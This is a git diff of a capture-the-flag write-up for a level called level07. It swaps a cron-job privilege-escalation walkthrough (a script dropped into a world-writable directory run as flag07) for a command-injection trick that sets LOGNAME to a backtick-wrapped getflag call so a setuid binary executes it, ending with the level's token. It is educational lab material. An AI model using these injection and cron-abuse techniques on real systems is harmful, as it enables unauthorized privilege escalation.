@@ -1,51 +1,24 @@
-# cat README
+Like another level we can see only one binary and few things when we use strings
+
 ```
-level07@BornToSec:~$ cat README
-*/2 * * * * su -c \"sh /home/user/level07/level07.sh\" - flag07.
-Man crontab
+getenv
+...
+LOGNAME
+/bin/echo %s
 ```
 
-# we can see that there is a cron running every 2 min ( */2 )
-# and excute the script level07 with user flag07
-# lets check it
-```
-level07@BornToSec:~$ cat level07.sh
-#!/bin/sh
+we can assume that they simply echo the env variable $LOGNAME, which is the current user name.
 
-for i in /home/user/level07/writable.d/* ; do
-	(ulimit -t 5; bash -x "$i")
-	rm -f "$i"
-done
+we can now write a simple exploit by changing the env variable.
+
+```
+level07@SnowCrash:~$ export LOGNAME=abcd; ./level07
+abcd
 ```
 
-# if we ls -la to see what is going on 
-```
-level07@BornToSec:~$ l
-total 20
-dr-xr-x---+ 1 level07 level07  160 Aug 30 17:51 .
-d--x--x--x  1 root    users    340 Aug 30 17:51 ..
--r-x------  1 level07 level07  220 Apr  3  2012 .bash_logout
--r-x------  1 level07 level07 3518 Aug 30 17:51 .bashrc
--rwsr-s---  1 flag07  level07  103 Aug 30 17:51 level07.sh
--r-x------  1 level07 level07  675 Apr  3  2012 .profile
-----r--r--  1 flag07  level07   77 Aug 30 17:51 README
-drwxrwxrwx  1 level07 level07   40 Feb 28 23:16 writable.d
-```
+It's works so we simply change it to a simple exploit
 
-# we have full right rwx into writable.d lets
-# bash -x execute the script in debug mode
-# lets write a little script
 ```
-level07@BornToSec:~$ cat writable.d/script
-getflag > /tmp/flag3
-```
-
-# just need to wait 2 min for cron to run
-# result
-```
-level07@BornToSec:~/writable.d$ ls
-script
-level07@BornToSec:~/writable.d$ ls
-level07@BornToSec:~/writable.d$ cat /tmp/flag3
+level07@SnowCrash:~$ export LOGNAME=\`getflag\`; ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 ```
